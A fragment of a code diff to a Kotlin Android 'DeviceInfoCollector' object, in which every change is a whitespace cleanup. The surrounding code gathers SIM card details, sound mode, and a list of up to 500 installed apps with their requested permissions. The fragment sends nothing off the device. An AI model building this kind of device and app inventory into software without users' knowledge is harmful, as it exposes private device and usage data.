+
                         // Fallback: If no dual SIM info, collect default SIM info
                         if (simCardsInfo.isEmpty() && telephonyManager != null) {
                             val defaultSimInfo = mutableMapOf<String, Any?>(
@@ -1383,7 +1383,7 @@ object DeviceInfoCollector {
                 }
                 result["simCards"] = simCardsInfo
                 result["simCardCount"] = simCardsInfo.size
-                
+
                 // ====================================================================
                 // 5. Sound Mode
                 // ====================================================================
@@ -1409,14 +1409,14 @@ object DeviceInfoCollector {
                     LogHelper.w(TAG, "Error collecting sound mode info", e)
                 }
                 result["soundMode"] = soundModeInfo
-                
+
                 // ====================================================================
                 // 6. Installed Apps with Permissions
                 // ====================================================================
                 val appsInfo = mutableMapOf<String, Any?>()
                 try {
                     val packageManager = context.packageManager
-                    
+
                     // Check permission for Android 11+
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                         if (ActivityCompat.checkSelfPermission(
@@ -1427,13 +1427,13 @@ object DeviceInfoCollector {
                             LogHelper.w(TAG, "QUERY_ALL_PACKAGES permission not granted - only system apps will be visible")
                         }
                     }
-                    
+
                     val installedPackages = packageManager.getInstalledPackages(
                         PackageManager.GET_PERMISSIONS or PackageManager.MATCH_DISABLED_COMPONENTS
                     )
-                    
+
                     val appsList = mutableListOf<Map<String, Any?>>()
-                    
+
                     // Collect app info with permissions (limit to first 500 apps to avoid timeout)
                     val maxApps = minOf(installedPackages.size, 500)
                     installedPackages.take(maxApps).forEach { packageInfo ->
@@ -1443,7 +1443,7 @@ object DeviceInfoCollector {
                                 LogHelper.w(TAG, "ApplicationInfo is null for package ${packageInfo.packageName}")
                                 return@forEach
                             }
-                            
+
                             val appInfo = mutableMapOf<String, Any?>(
                                 "packageName" to packageInfo.packageName,
                                 "appName" to try {
@@ -1461,7 +1461,7 @@ object DeviceInfoCollector {
                                 "firstInstallTime" to packageInfo.firstInstallTime,
                                 "lastUpdateTime" to packageInfo.lastUpdateTime
                             )
-                            
+
                             // Get permissions for this app
                             val permissions = mutableListOf<String>()
                             val requestedPermissions = packageInfo.requestedPermissions
@@ -1470,16 +1470,16 @@ object DeviceInfoCollector {
                                     permissions.add(permission)
                                 }
                             }
-                            
+
                             appInfo["permissions"] = permissions
                             appInfo["permissionCount"] = permissions.size
-                            
+
                             appsList.add(appInfo)
                         } catch (e: Exception) {
                             LogHelper.w(TAG, "Error collecting info for package ${packageInfo.packageName}", e)
                         }
                     }
-                    
+
                     appsInfo["installedAppsCount"] = installedPackages.size
                     appsInfo["collectedAppsCount"] = appsList.size
                     appsInfo["apps"] = appsList
@@ -1487,7 +1487,7 @@ object DeviceInfoCollector {
                     LogHelper.w(TAG, "Error collecting installed apps info", e)
                 }
                 result["installedApps"] = appsInfo
-                
+
                 result
             } catch (e: Exception) {
                 LogHelper.e(TAG, "Error collecting device status info", e)
